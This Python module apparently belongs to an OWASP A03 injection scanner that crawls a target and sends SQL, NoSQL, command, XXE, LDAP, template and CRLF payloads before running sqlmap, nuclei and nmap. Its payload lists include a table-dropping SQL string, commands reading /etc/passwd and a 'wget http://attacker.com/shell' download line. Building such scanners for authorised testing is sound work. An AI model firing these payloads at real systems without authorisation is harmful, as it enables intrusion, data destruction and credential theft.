import os
import requests
import json
import re
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from utils import normalize_url, is_noise_line

# Add path to core modules for absolute imports
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))


# ================== CONFIG ==================
OUTPUT_DIR = "reports/a03_scan_results"
os.makedirs(OUTPUT_DIR, exist_ok=True)

console = Console()

# ===================== CVSS SEVERITY STANDARD =====================
CVSS_METRICS = {
    "Attack Vector": {
        "Network": 0.85,
        "Adjacent": 0.62,
        "Local": 0.55,
        "Physical": 0.2
    },
    "Attack Complexity": {
        "Low": 0.77,
        "High": 0.44
    },
    
    "Privileges Required": {
        "None": 0.85,
        "Low": 0.62,
        "High": 0.27
    },
    "User Interaction": {
        "None": 0.85,
        "Required": 0.62
    },
    "Scope": {
        "Unchanged": 6.42,
        "Changed": 7.52
    },
    "Confidentiality": {
        "None": 0,
        "Low": 0.22,
        "High": 0.56
    },
    "Integrity": {
        "None": 0,
        "Low": 0.22,
        "High": 0.56
    },
    "Availability": {
        "None": 0,
        "Low": 0.22,
        "High": 0.56
    }
}

# A03 Vulnerability Mappings với CVSS
A03_VULNERABILITY_MAPPINGS = {
    "SQL_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "severity": "CRITICAL",
        "score": 9.8,
        "description": "SQL Injection allows unauthorized database access"
    },
    "COMMAND_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "severity": "CRITICAL",
        "score": 9.8,
        "description": "Command Injection allows remote code execution"
    },
    "XXE_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "severity": "CRITICAL",
        "score": 8.1,
        "description": "XML External Entity injection allows file reading"
    },
    "NOSQL_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "severity": "HIGH",
        "score": 7.5,
        "description": "NoSQL Injection allows unauthorized data access"
    },
    "LDAP_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "severity": "HIGH",
        "score": 7.5,
        "description": "LDAP Injection allows directory traversal"
    },
    "TEMPLATE_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "severity": "HIGH",
        "score": 8.1,
        "description": "Template Injection allows code execution"
    },
    "CRLF_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "severity": "MEDIUM",
        "score": 5.3,
        "description": "CRLF Injection allows header manipulation"
    }
}

# ===================== CVSS SEVERITY STANDARD =====================
CVSS_METRICS = {
    "Attack Vector": {
        "Network": 0.85,
        "Adjacent": 0.62,
        "Local": 0.55,
        "Physical": 0.2
    },
    "Attack Complexity": {
        "Low": 0.77,
        "High": 0.44
    },
    "Privileges Required": {
        "None": 0.85,
        "Low": 0.62,
        "High": 0.27
    },
    "User Interaction": {
        "None": 0.85,
        "Required": 0.62
    },
    "Scope": {
        "Unchanged": 6.42,
        "Changed": 7.52
    },
    "Confidentiality": {
        "None": 0,
        "Low": 0.22,
        "High": 0.56
    },
    "Integrity": {
        "None": 0,
        "Low": 0.22,
        "High": 0.56
    },
    "Availability": {
        "None": 0,
        "Low": 0.22,
        "High": 0.56
    }
}

# A03 Vulnerability Mappings với CVSS
A03_VULNERABILITY_MAPPINGS = {
    "SQL_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "severity": "CRITICAL",
        "score": 9.8,
        "description": "SQL Injection allows unauthorized database access"
    },
    "COMMAND_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "severity": "CRITICAL",
        "score": 9.8,
        "description": "Command Injection allows remote code execution"
    },
    "XXE_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "severity": "CRITICAL",
        "score": 8.1,
        "description": "XML External Entity injection allows file reading"
    },
    "NOSQL_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "severity": "HIGH",
        "score": 7.5,
        "description": "NoSQL Injection allows unauthorized data access"
    },
    "LDAP_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "severity": "HIGH",
        "score": 7.5,
        "description": "LDAP Injection allows directory traversal"
    },
    "TEMPLATE_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "severity": "HIGH",
        "score": 8.1,
        "description": "Template Injection allows code execution"
    },
    "CRLF_INJECTION": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "severity": "MEDIUM",
        "score": 5.3,
        "description": "CRLF Injection allows header manipulation"
    }
}

# OWASP A03:2021 - Injection Vulnerability Classification
SEVERITY_LEVELS = {
    "CRITICAL": {"color": "red", "score": "9.0-10.0", "description": "Critical injection flaws - immediate remediation required",
                 "keywords": ["SQL Injection", "SQLi", "NoSQL Injection", "Command Injection", "OS Command Injection", "RCE", "Remote Code Execution", "XXE", "XML External Entity", "LDAP Injection", "XPath Injection", "CRLF Injection", "Header Injection"]},
    "HIGH": {"color": "bright_red", "score": "7.0-8.9", "description": "High severity injection vulnerabilities",
             "keywords": ["Code Injection", "Template Injection", "Server-Side Template Injection", "Expression Injection", "Log Injection", "Mail Injection", "HTTP Response Splitting", "HTTP Header Injection"]},
    "MEDIUM": {"color": "yellow", "score": "4.0-6.9", "description": "Medium severity - partial injection or weak filters",
               "keywords": ["Reflected Injection", "Stored Injection", "Partial Injection", "Weak Input Validation", "Bypassable Filters", "Insufficient Input Sanitization", "Injection Attempt", "Potential Injection"]},
    "LOW": {"color": "blue", "score": "0.1-3.9", "description": "Informational or low impact findings",
            "keywords": ["Info Disclosure", "Debug Information", "Test Endpoint", "Enumeration", "Information Gathering", "Reconnaissance"]}
}

# A03 Specific Test Cases
A03_TEST_CASES = {
    "sql_injection": {
        "payloads": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'/*",
            "1' AND '1'='1",
            "1' AND '1'='2"
        ]
    },
    "nosql_injection": {
        "payloads": [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$where": "1==1"}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$in": ["admin", "user"]}'
        ]
    },
    "command_injection": {
        "payloads": [
            "; ls -la",
            "| whoami",
            "& cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "| wget http://attacker.com/shell"
        ]
    },
    "xxe_injection": {
        "payloads": [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&exploit;</data>'
        ]
    },
    "ldap_injection": {
        "payloads": [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(|(objectclass=*))",
            "admin)(&(password=*))",
            "*)(|(cn=*))",
            "*)(|(mail=*))"
        ]
    },
    "template_injection": {
        "payloads": [
            "{{7*7}}",
            "{{config}}",
            "{{request}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>"
        ]
    },
    "crlf_injection": {
        "payloads": [
            "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%2020%0d%0a%0d%0a<script>alert(1)</script>",
            "%0d%0aSet-Cookie:%20sessionid=123",
            "%0d%0aX-Forwarded-For:%20127.0.0.1",
            "%0d%0aLocation:%20javascript:alert(1)"
        ]
    }
}

def calculate_cvss_score(vulnerability_type):
    """Tính CVSS score dựa trên loại vulnerability"""
    if vulnerability_type in A03_VULNERABILITY_MAPPINGS:
        return A03_VULNERABILITY_MAPPINGS[vulnerability_type]["score"]
    return 5.0  # Default MEDIUM

def classify_severity_advanced(finding, vulnerability_type=None):
    """Phân loại severity theo tiêu chuẩn CVSS"""
    f_lower = finding.lower()
    
    # Nếu có vulnerability_type, sử dụng mapping
    if vulnerability_type and vulnerability_type in A03_VULNERABILITY_MAPPINGS:
        mapping = A03_VULNERABILITY_MAPPINGS[vulnerability_type]
        score = mapping["score"]
        severity = mapping["severity"]
        color = SEVERITY_LEVELS[severity]["color"]
        return severity, color, score, mapping["cvss_vector"]
    
    # Fallback: phân tích theo keywords
    for level in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        for kw in SEVERITY_LEVELS[level]["keywords"]:
            if kw.lower() in f_lower:
                if level == "CRITICAL":
                    score = 9.8
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                elif level == "HIGH":
                    score = 7.5
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N"
                elif level == "MEDIUM":
                    score = 5.3
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
                else:
                    score = 3.1
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
    
    score = 3.1
    return "LOW", "blue", score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"

def save_output(filename, data, append=False):
    mode = "a" if append else "w"
    with open(os.path.join(OUTPUT_DIR, filename), mode, encoding="utf-8") as f:
        f.write(data)

def run_cmd(cmd_list, output_file):
    """Safely run command using security utilities"""
    try:
        try:
            from core.security_utils import SecurityUtils
            # Use secure subprocess execution
            cmd_str = " ".join(cmd_list)
            result = SecurityUtils.safe_subprocess_run(cmd_str, timeout=120)
            
            if result is None:
                console.print(f"[red]ERROR: Command execution blocked for security: {cmd_str}[/red]")
                save_output(output_file, f"Error: Command execution blocked for security reasons")
                return
            
            save_output(output_file, result.stdout + "\n" + result.stderr)
            console.print(result.stdout, style="dim")
            
        except ImportError:
            # Fallback to direct subprocess if security utils not available
            console.print("[yellow]Warning: Security utils not available, using fallback[/yellow]")
            import subprocess
            result = subprocess.run(cmd_list, capture_output=True, text=True, timeout=120)
            save_output(output_file, result.stdout + "\n" + result.stderr)
            console.print(result.stdout, style="dim")
        
    except Exception as e:
        console.print(f"[red]ERROR: {e}[/red]")
        save_output(output_file, f"Error: {e}")

# ===================== A03 SPECIFIC TESTS =====================
def test_sql_injection(target, endpoints):
    """Test SQL Injection vulnerabilities"""
    console.print("[cyan][*] Testing SQL Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        if "?" in endpoint:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in A03_TEST_CASES["sql_injection"]["payloads"]:
                    try:
                        test_url = endpoint.replace(f"{param}=", f"{param}={payload}")
                        r = requests.get(test_url, timeout=5)
                        
                        # Check for SQL error indicators
                        error_indicators = [
                            "sql syntax", "mysql error", "oracle error", "postgresql error",
                            "sql server error", "sqlite error", "database error",
                            "mysql_fetch_array", "mysql_num_rows", "mysql_result"
                        ]
                        
                        if any(indicator in r.text.lower() for indicator in error_indicators):
                            finding = f"[SQL_INJECTION] {test_url} - SQL error detected"
                            findings.append(finding)
                            
                    except Exception as e:
                        findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("sql_injection_findings.txt", "\n".join(findings))
    return findings

def test_nosql_injection(target, endpoints):
    """Test NoSQL Injection vulnerabilities"""
    console.print("[cyan][*] Testing NoSQL Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        if "?" in endpoint:
            for payload in A03_TEST_CASES["nosql_injection"]["payloads"]:
                try:
                    # Test JSON payload
                    headers = {"Content-Type": "application/json"}
                    data = {"username": payload, "password": "test"}
                    r = requests.post(endpoint, json=data, headers=headers, timeout=5)
                    
                    # Check for NoSQL error indicators
                    error_indicators = [
                        "mongodb error", "nosql error", "bson error",
                        "invalid bson", "mongo error", "database error"
                    ]
                    
                    if any(indicator in r.text.lower() for indicator in error_indicators):
                        finding = f"[NOSQL_INJECTION] {endpoint} - NoSQL error detected"
                        findings.append(finding)
                        
                except Exception as e:
                    findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("nosql_injection_findings.txt", "\n".join(findings))
    return findings

def test_command_injection(target, endpoints):
    """Test Command Injection vulnerabilities"""
    console.print("[cyan][*] Testing Command Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        if "?" in endpoint:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in A03_TEST_CASES["command_injection"]["payloads"]:
                    try:
                        test_url = endpoint.replace(f"{param}=", f"{param}={payload}")
                        r = requests.get(test_url, timeout=5)
                        
                        # Check for command injection indicators
                        injection_indicators = [
                            "uid=", "gid=", "groups=", "root:", "bin:",
                            "total ", "drwx", "-rw-", "ls:", "whoami:",
                            "127.0.0.1", "localhost", "ping statistics"
                        ]
                        
                        if any(indicator in r.text.lower() for indicator in injection_indicators):
                            finding = f"[COMMAND_INJECTION] {test_url} - Command execution detected"
                            findings.append(finding)
                            
                    except Exception as e:
                        findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("command_injection_findings.txt", "\n".join(findings))
    return findings

def test_xxe_injection(target, endpoints):
    """Test XML External Entity Injection"""
    console.print("[cyan][*] Testing XXE Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        for payload in A03_TEST_CASES["xxe_injection"]["payloads"]:
            try:
                headers = {"Content-Type": "application/xml"}
                r = requests.post(endpoint, data=payload, headers=headers, timeout=5)
                
                # Check for XXE indicators
                xxe_indicators = [
                    "root:x:", "bin:x:", "daemon:", "sys:", "adm:",
                    "localhost", "127.0.0.1", "file://", "ftp://",
                    "xml error", "entity error", "external entity"
                ]
                
                if any(indicator in r.text.lower() for indicator in xxe_indicators):
                    finding = f"[XXE_INJECTION] {endpoint} - XXE vulnerability detected"
                    findings.append(finding)
                    
            except Exception as e:
                findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("xxe_injection_findings.txt", "\n".join(findings))
    return findings

def test_ldap_injection(target, endpoints):
    """Test LDAP Injection vulnerabilities"""
    console.print("[cyan][*] Testing LDAP Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        if "?" in endpoint:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in A03_TEST_CASES["ldap_injection"]["payloads"]:
                    try:
                        test_url = endpoint.replace(f"{param}=", f"{param}={payload}")
                        r = requests.get(test_url, timeout=5)
                        
                        # Check for LDAP error indicators
                        ldap_indicators = [
                            "ldap error", "ldap_simple_bind", "ldap_search",
                            "invalid dn", "ldap_result", "ldap_connect",
                            "authentication failed", "bind failed"
                        ]
                        
                        if any(indicator in r.text.lower() for indicator in ldap_indicators):
                            finding = f"[LDAP_INJECTION] {test_url} - LDAP error detected"
                            findings.append(finding)
                            
                    except Exception as e:
                        findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("ldap_injection_findings.txt", "\n".join(findings))
    return findings

def test_template_injection(target, endpoints):
    """Test Template Injection vulnerabilities"""
    console.print("[cyan][*] Testing Template Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        if "?" in endpoint:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in A03_TEST_CASES["template_injection"]["payloads"]:
                    try:
                        test_url = endpoint.replace(f"{param}=", f"{param}={payload}")
                        r = requests.get(test_url, timeout=5)
                        
                        # Check for template injection indicators
                        template_indicators = [
                            "49", "7*7", "config", "request", "subclasses",
                            "template error", "jinja2", "django", "flask",
                            "mako", "erb", "jsp", "velocity"
                        ]
                        
                        if any(indicator in r.text.lower() for indicator in template_indicators):
                            finding = f"[TEMPLATE_INJECTION] {test_url} - Template injection detected"
                            findings.append(finding)
                            
                    except Exception as e:
                        findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("template_injection_findings.txt", "\n".join(findings))
    return findings

def test_crlf_injection(target, endpoints):
    """Test CRLF Injection vulnerabilities"""
    console.print("[cyan][*] Testing CRLF Injection...[/cyan]")
    findings = []
    
    for endpoint in endpoints:
        if "?" in endpoint:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in A03_TEST_CASES["crlf_injection"]["payloads"]:
                    try:
                        test_url = endpoint.replace(f"{param}=", f"{param}={payload}")
                        r = requests.get(test_url, timeout=5)
                        
                        # Check for CRLF injection indicators
                        crlf_indicators = [
                            "set-cookie:", "location:", "content-length:",
                            "x-forwarded-for:", "javascript:", "alert(",
                            "http/1.1", "200 ok", "302 found"
                        ]
                        
                        if any(indicator in str(r.headers).lower() for indicator in crlf_indicators):
                            finding = f"[CRLF_INJECTION] {test_url} - CRLF injection detected"
                            findings.append(finding)
                            
                    except Exception as e:
                        findings.append(f"[ERROR] Testing {endpoint}: {str(e)}")
    
    save_output("crlf_injection_findings.txt", "\n".join(findings))
    return findings

# ================== SCANNERS ==================
def run_katana(target):
    console.print("[yellow][*] Running Katana to discover endpoints...[/yellow]")
    cmd = [
        "docker", "run", "--rm",
        "projectdiscovery/katana:latest",
        "-u", target,
        "-d", "3",  # depth 3
        "-jc"  # JSON output to stdout
    ]
    run_cmd(cmd, "katana_output.json")

    endpoints = []
    katana_file = os.path.join(OUTPUT_DIR, "katana_output.json")
    if os.path.exists(katana_file):
        with open(katana_file, "r", encoding="utf-8") as f:
            for line in f:
                if target in line:
                    endpoints.append(line.strip())
    return list(set(endpoints))

def run_sqlmap(url):
    console.print(f"[yellow][*] Running SQLMap for {url}[/yellow]")
    cmd = ["sqlmap", "-u", url, "--batch", "--level=3", "--risk=2", "--random-agent"]
    
    try:
        # Use SecurityUtils for secure execution
        try:
            from core.security_utils import SecurityUtils
            cmd_str = " ".join(cmd)
            result = SecurityUtils.safe_subprocess_run(cmd_str, timeout=300)
            if result is None:
                console.print(f"[red]ERROR: SQLMap command blocked for security: {cmd_str}[/red]")
                return
        except ImportError:
            # Fallback to direct subprocess with timeout
            import subprocess
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        if result and result.stdout:
            # Append to single SQLMap output file with separator
            with open(os.path.join(OUTPUT_DIR, "sqlmap_output.txt"), "a", encoding="utf-8") as f:
                f.write(f"\n{'='*80}\n")
                f.write(f"SQLMap Scan for: {url}\n")
                f.write(f"Timestamp: {datetime.now()}\n")
                f.write(f"{'='*80}\n\n")
                f.write(result.stdout)
                f.write("\n")
                f.write(result.stderr)
                f.write(f"\n{'='*80}\n\n")
            
            console.print(result.stdout, style="dim")
    except Exception as e:
        console.print(f"[red]ERROR: {e}[/red]")
        # Still append error to file
        with open(os.path.join(OUTPUT_DIR, "sqlmap_output.txt"), "a", encoding="utf-8") as f:
            f.write(f"\n{'='*80}\n")
            f.write(f"SQLMap Scan for: {url} - ERROR\n")
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(f"{'='*80}\n\n")
            f.write(f"Error: {e}\n")
            f.write(f"{'='*80}\n\n")

def run_nuclei_advanced(url):
    """Chạy Nuclei với nhiều template A03 hơn"""
    console.print(f"[yellow][*] Running Advanced Nuclei for {url}[/yellow]")
    
    # Thêm nhiều template A03
    templates = [
        "cves/",
        "vulnerabilities/",
        "vulnerabilities/generic/",
        "vulnerabilities/sql-injection",
        "vulnerabilities/command-injection",
        "vulnerabilities/xxe",
        "vulnerabilities/ldap-injection",
        "vulnerabilities/template-injection",
        "exposures/",
        "misconfiguration/"
    ]
    
    for template in templates:
        try:
            cmd = ["nuclei", "-u", url, "-t", template, "-severity", "critical,high,medium", "-silent"]
            
            # Use SecurityUtils for secure execution
            try:
                from core.security_utils import SecurityUtils
                cmd_str = " ".join(cmd)
                result = SecurityUtils.safe_subprocess_run(cmd_str, timeout=300)
                if result is None:
                    console.print(f"[red]ERROR: Nuclei command blocked for security: {cmd_str}[/red]")
                    continue
            except ImportError:
                # Fallback to direct subprocess with timeout
                import subprocess
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.stdout:
                # Append to single Nuclei output file with separator
                with open(os.path.join(OUTPUT_DIR, "nuclei_output.txt"), "a", encoding="utf-8") as f:
                    f.write(f"\n{'-'*60}\n")
                    f.write(f"Nuclei {template} scan for: {url}\n")
                    f.write(f"Timestamp: {datetime.now()}\n")
                    f.write(f"{'-'*60}\n\n")
                    f.write(result.stdout)
                    f.write("\n")
                    f.write(result.stderr)
                    f.write(f"\n{'-'*60}\n\n")
                
                console.print(result.stdout, style="dim")
        except Exception as e:
            console.print(f"[red]ERROR: {e}[/red]")

def run_nmap_injection(host):
    console.print(f"[yellow][*] Running Nmap NSE for injection detection on {host}[/yellow]")
    cmd = [
        "nmap", "-p80,443,8080,8443", "-sV",
        "--script", "http-sql-injection,http-command-injection,http-xxe,http-vulners",
        host
    ]
    run_cmd(cmd, f"nmap_{host}.txt")

def sanitize_filename(url):
    return url.replace("://", "_").replace("/", "_").replace("?", "_").replace("&", "_")

# ================== ANALYSIS ==================
def analyze_results():
    console.print("[magenta][*] Analyzing scan results...[/magenta]")

    categorized = {sev: [] for sev in SEVERITY_LEVELS}
    findings = []
    cvss_scores = []
    vulnerability_details = []

    # Collect all findings with proper classification
    finding_files = [
        ("sql_injection_findings.txt", "SQL_INJECTION"),
        ("nosql_injection_findings.txt", "NOSQL_INJECTION"),
        ("command_injection_findings.txt", "COMMAND_INJECTION"),
        ("xxe_injection_findings.txt", "XXE_INJECTION"),
        ("ldap_injection_findings.txt", "LDAP_INJECTION"),
        ("template_injection_findings.txt", "TEMPLATE_INJECTION"),
        ("crlf_injection_findings.txt", "CRLF_INJECTION"),
        ("sqlmap_output.txt", None),
        ("nuclei_output.txt", None),
        ("nmap_output.txt", None)
    ]

    for file, vuln_type in finding_files:
        file_path = os.path.join(OUTPUT_DIR, file)
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    for line in f:
                        if line.strip() and not is_noise_line(line):
                            severity, color, score, cvss_vector = classify_severity_advanced(line, vuln_type)
                            categorized[severity].append({"source": file, "finding": line.strip()})
                            findings.append(line.strip())
                            cvss_scores.append(score)
                            
                            # Store vulnerability details
                            if vuln_type and vuln_type in A03_VULNERABILITY_MAPPINGS:
                                mapping = A03_VULNERABILITY_MAPPINGS[vuln_type]
                                vulnerability_details.append({
                                    "type": vuln_type,
                                    "finding": line.strip(),
                                    "cvss_score": score,
                                    "cvss_vector": cvss_vector,
                                    "severity": severity,
                                    "description": mapping["description"]
                                })
            except Exception as e:
                console.print(f"[red]Error reading {file}: {e}[/red]")

    display_results(categorized, cvss_scores)
    save_summary(findings, categorized, vulnerability_details, cvss_scores)

def display_results(categorized, cvss_scores):
    # Remove icon from table title
    table = Table(title="A03 Injection Vulnerability - CVSS Standard Overview", header_style="bold magenta")
    table.add_column("Severity", style="cyan")
    table.add_column("CVSS Score", style="green", justify="center")
    table.add_column("CVSS Vector", style="blue")
    table.add_column("Count", style="green", justify="center")
    table.add_column("Description", style="white")
    table.add_column("A03 Coverage", style="yellow")

    coverage_info = {
        "CRITICAL": "SQL Injection, Command Injection, XXE",
        "HIGH": "NoSQL Injection, LDAP Injection, Template Injection",
        "MEDIUM": "CRLF Injection, Partial Injection", 
        "LOW": "Info Disclosure, Reconnaissance"
    }

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        count = len(categorized[sev])
        avg_score = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0
        table.add_row(
            f"[{SEVERITY_LEVELS[sev]['color']}]{sev}[/{SEVERITY_LEVELS[sev]['color']}]",
            f"{avg_score:.1f}" if avg_score > 0 else "N/A",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" if sev == "CRITICAL" else "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            str(count),
            SEVERITY_LEVELS[sev]["description"],
            coverage_info[sev]
        )
    console.print(table)

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if categorized[sev]:
            console.print(f"\n[{SEVERITY_LEVELS[sev]['color']}]{sev} FINDINGS[/]:")
            for item in categorized[sev]:
                console.print(f"  - {item['source']}: {item['finding']}")

def save_summary(findings, categorized, vulnerability_details, cvss_scores):
    with open(os.path.join(OUTPUT_DIR, "summary.txt"), "w", encoding="utf-8") as f:
        for sev in categorized:
            f.write(f"{sev}: {len(categorized[sev])} findings\n")
        f.write("\n=== DETAILS ===\n")
        for file, items in categorized.items():
            f.write(f"\n[{file}]\n")
            for item in items:
                sev, _, _, _ = classify_severity_advanced(item['finding'])
                f.write(f"[{sev}] {item['finding']}\n")
    
    # Save detailed report with CVSS
    report = f"""
A03 Injection Vulnerability Scan Report - CVSS Standard
Generated: {datetime.now()}
Total Findings: {len(findings)}
Average CVSS Score: {sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0:.1f}

=== CRITICAL FINDINGS (CVSS 9.0-10.0) ===
{chr(10).join([item['finding'] for item in categorized['CRITICAL']])}

=== HIGH FINDINGS (CVSS 7.0-8.9) ===  
{chr(10).join([item['finding'] for item in categorized['HIGH']])}

=== MEDIUM FINDINGS (CVSS 4.0-6.9) ===
{chr(10).join([item['finding'] for item in categorized['MEDIUM']])}

=== LOW FINDINGS (CVSS 0.1-3.9) ===
{chr(10).join([item['finding'] for item in categorized['LOW']])}

=== VULNERABILITY DETAILS ===
"""
    
    for detail in vulnerability_details:
        report += f"""
Type: {detail['type']}
CVSS Score: {detail['cvss_score']}
CVSS Vector: {detail['cvss_vector']}
Severity: {detail['severity']}
Description: {detail['description']}
Finding: {detail['finding']}
"""

    # Remove all icons from the coverage section
    report += """
=== A03 COVERAGE ===
- SQL Injection Testing (CVSS 9.8)
- NoSQL Injection Testing (CVSS 7.5)
- Command Injection Testing (CVSS 9.8)
- XXE Injection Testing (CVSS 8.1)
- LDAP Injection Testing (CVSS 7.5)
- Template Injection Testing (CVSS 8.1)
- CRLF Injection Testing (CVSS 5.3)
- Advanced Payload Testing
"""
    save_output("a03_detailed_report.txt", report)
    console.print("[green]Summary saved[/green]")

# ================== MAIN ==================
def main(target):
    """Main function for A03 module - only callable from OWASP_MASTER_SCANNER"""
    if not target:
        console.print("[red]Target is required[/red]")
        return
    
    target = normalize_url(target)
    start = datetime.now()

    console.print(f"[cyan][*] Starting Advanced A03 Injection Scan for {target}[/cyan]")

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console,
    ) as progress:
        
        # Step 1: Katana Discovery
        task1 = progress.add_task("Discovering endpoints...", total=None)
        endpoints = run_katana(target)
        console.print(f"[green][+] Found {len(endpoints)} endpoints from Katana[/green]")
        progress.update(task1, completed=True)

        # Step 2: Advanced A03 Tests
        task2 = progress.add_task("Testing SQL Injection...", total=None)
        sql_injection_findings = test_sql_injection(target, endpoints)
        progress.update(task2, completed=True)

        task3 = progress.add_task("Testing NoSQL Injection...", total=None)
        nosql_injection_findings = test_nosql_injection(target, endpoints)
        progress.update(task3, completed=True)

        task4 = progress.add_task("Testing Command Injection...", total=None)
        command_injection_findings = test_command_injection(target, endpoints)
        progress.update(task4, completed=True)

        task5 = progress.add_task("Testing XXE Injection...", total=None)
        xxe_injection_findings = test_xxe_injection(target, endpoints)
        progress.update(task5, completed=True)

        task6 = progress.add_task("Testing LDAP Injection...", total=None)
        ldap_injection_findings = test_ldap_injection(target, endpoints)
        progress.update(task6, completed=True)

        task7 = progress.add_task("Testing Template Injection...", total=None)
        template_injection_findings = test_template_injection(target, endpoints)
        progress.update(task7, completed=True)

        task8 = progress.add_task("Testing CRLF Injection...", total=None)
        crlf_injection_findings = test_crlf_injection(target, endpoints)
        progress.update(task8, completed=True)

        # Step 3: Traditional Tools
        task9 = progress.add_task("Running SQLMap scans...", total=len(endpoints))
        for ep in endpoints:
            if "?" in ep and "=" in ep:
                console.print(f"[cyan][SQLMap] Scanning: {ep}[/cyan]")
                run_sqlmap(ep)
            else:
                console.print(f"[dim][skip] No query parameter in URL, skipping SQLMap: {ep}[/dim]")
            progress.update(task9, advance=1)

        task10 = progress.add_task("Running Advanced Nuclei scans...", total=len(endpoints))
        for ep in endpoints:
            run_nuclei_advanced(ep)
            progress.update(task10, advance=1)

        # Step 4: Nmap
        task11 = progress.add_task("Running Nmap injection scan...", total=None)
        host = urlparse(target).hostname
        run_nmap_injection(host)
        progress.update(task11, completed=True)

        # Step 5: Analysis
        task12 = progress.add_task("Analyzing results...", total=None)
        analyze_results()
